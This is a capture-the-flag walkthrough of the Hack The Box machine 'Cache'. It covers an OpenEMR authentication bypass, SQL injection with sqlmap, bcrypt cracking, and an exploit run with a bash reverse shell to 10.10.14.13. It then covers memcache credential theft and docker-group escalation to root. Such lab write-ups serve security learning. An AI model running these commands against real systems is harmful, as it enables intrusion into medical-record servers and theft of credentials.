# Cache

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.211.212
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 10:30 EDT
Nmap scan report for 10.129.211.212
Host is up (0.0089s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Accidental Subdomain Enum

Port 80 reveals a blog like website:

<figure><img src="../../../.gitbook/assets/image (2633).png" alt=""><figcaption></figcaption></figure>

There's not much here, but we can add `cache.htb` to our `/etc/hosts` file since there's a banner for it on screen. I ran a `gobuster` and `wfuzz` scan on the machine. Funnily, I accidentally had a typo in my `wfuzz` command, and found a completely new domain present:

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host:FUZZ.htb' --hw=973 -u http://cache.htb  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cache.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================
                   
000010187:   302        0 L      0 W        0 Ch        "hms"
```

`hms.htb` is active on this machine. We can visit that.

### OpenEMR

The page shows us a login for OpenEMR, which is known to have a ton of vulnerabilities:

<figure><img src="../../../.gitbook/assets/image (2872).png" alt=""><figcaption></figcaption></figure>

We can head to the Github Repo for this software and attempt to find its version using the default files present:

{% embed url="https://github.com/openemr/openemr" %}

Visiting `sql_patch.php` reveals that this is OpenEMR 5.0.1:

<figure><img src="../../../.gitbook/assets/image (1667).png" alt=""><figcaption></figcaption></figure>

This version has quite a few RCE exploits for it:

```
$ searchsploit openemr 5.0.1
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
OpenEMR 5.0.1 - 'controller' Remote Code Execution         | php/webapps/48623.txt
OpenEMR 5.0.1 - Remote Code Execution (1)                  | php/webapps/48515.py
OpenEMR 5.0.1 - Remote Code Execution (Authenticated) (2)  | php/webapps/49486.rb
OpenEMR 5.0.1.3 - Authentication Bypass                    | php/webapps/50017.py
```

There's also an authentication bypass exploit here:

{% embed url="https://www.exploit-db.com/exploits/50017" %}

To bypass it, all we have to do is simply visit `/portal/account/register.php`, and it would treat us as logged in with a valid token. Searching for exploits led me to a [PDF](https://www.open-emr.org/wiki/images/1/11/Openemr\_insecurity.pdf) that had the vulnerability report for v5.0.1.3, and there are lot including a lot of SQL Injections.

Firstly, visiting `/portal/find_appt_popup_user.php` just works as we have 'bypassed' the login.&#x20;

<figure><img src="../../../.gitbook/assets/image (2060).png" alt=""><figcaption></figcaption></figure>

For this case, the second PoC listed works best.&#x20;

<figure><img src="../../../.gitbook/assets/image (480).png" alt=""><figcaption></figcaption></figure>

Using `sqlmap`, we can enumerate and view the stuff in the database. (skipped the enumeration)

<pre><code>$ sqlmap -r req -D openemr -T users_secure --dump
<strong>Table: users_secure
</strong>[1 entry]
+----+---------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+--------------------------------+-------------------+
| id | salt    | password                                                     | username | last_update         | salt_history1 | salt_history2 | password_history1              | password_history2 |
+----+---------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+--------------------------------+-------------------+
| 1  | &#x3C;blank> | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | &#x3C;blank>  | 2019-11-21 06:38:40 | &#x3C;blank>       | &#x3C;blank>       | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin     |
+----+---------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+--------------------------------+-------------------+
</code></pre>

We can crack this hash in `john`.&#x20;

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash      
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxx           (?)     
1g 0:00:00:00 DONE (2023-05-10 10:53) 5.555g/s 4800p/s 4800c/s 4800C/s lester..felipe
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now that we have the admin password, we can do RCE.&#x20;

{% embed url="https://www.exploit-db.com/exploits/45161" %}

Remember to use `python2`.&#x20;

```
$ python2 45161.py -u openemr_admin -p xxxxxx -c 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1' http://hms.htb
```

<figure><img src="../../../.gitbook/assets/image (3650).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Ash Creds

I searched all the files within `/var/www` except for OpenEMR for credentials:

```
www-data@cache:/var/www/cache.htb/public_html$ grep -iRl 'Password' ./
./login.html
./index.html
./jquery/functionality.js
```

So here's the stuff within that file:

```javascript
www-data@cache:/var/www/cache.htb/public_html$ cat ./jquery/functionality.js
$(function(){
    
    var error_correctPassword = false;
    var error_username = false;
    
    function checkCorrectPassword(){
        var Password = $("#password").val();
        if(Password != 'H@v3_fun'){
            alert("Password didn't Match");
            error_correctPassword = true;
```

Using that password, we can `su` to `ash`.

<figure><img src="../../../.gitbook/assets/image (2505).png" alt=""><figcaption></figcaption></figure>

### Memcache

When we enumerate the ports that are open, we can see that port 11211 is listening:

```
ash@cache:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -            
<TRUNCATED>
```

This is the `memcache` service.

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/11211-memcache" %}

We can enumerate the items within it:

```
ash@cache:~$ echo "stats cachedump 1 0" | nc -vn -w 1 127.0.0.1 11211 
Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END
```

We can grab the password and `su` to `luffy`.

```
ash@cache:~$ echo "get passwd" | nc -vn -w 1 127.0.0.1 11211         
Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
VALUE passwd 0 9
0n3_p1ec3
END
```

### Docker Group

`luffy` is part of the `docker` group.&#x20;

```
luffy@cache:/home/ash$ id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
luffy@cache:/home/ash$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              2ca708c1c9cc        3 years ago         64.2MB
```

We can just run this command to create an Ubuntu container that is mounted on the main file system, where we have access to the container as `root`. This effectively gives us `root` access to the main file system to make `/bin/bash` an SUID binary.&#x20;

```
luffy@cache:/home/ash$ docker run -it --rm -v /:/mnt ubuntu chroot /mnt bash
root@ee809b31a278:/# id
uid=0(root) gid=0(root) groups=0(root)
root@ee809b31a278:/# cd root
root@ee809b31a278:~# ls
root.txt  run.sh  should_work
root@ee809b31a278:~# chmod u+s /bin/bash
```

Then we can exit this and get a shell with EUID of `root`.

<figure><img src="../../../.gitbook/assets/image (4010).png" alt=""><figcaption></figcaption></figure>
